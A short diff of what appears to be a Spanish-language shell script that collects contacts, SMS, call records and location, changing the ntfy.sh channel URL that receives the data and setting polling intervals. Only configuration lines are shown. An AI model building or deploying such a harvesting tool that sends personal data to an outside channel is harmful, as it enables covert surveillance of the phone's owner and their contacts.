@@ -3,7 +3,7 @@
 # Versión con recopilación de contactos, SMS y llamadas
 
 # ===== CONFIGURACIÓN =====
-NTFY_URL="https://ntfy.sh/V09ci1z1J2A1Iawp"  # Cambia por tu canal NTFY
+NTFY_URL="https://ntfy.sh/JD9WNS9ZNSKS9MQ0AL"  # Cambia por tu canal NTFY
 INTERVALO=300      # Intervalo principal: 5 minutos
 LOC_INTERVAL=60    # Intervalo ubicación: 1 minuto
 SMS_INTERVAL=15    # Chequeo SMS: 15 segundos
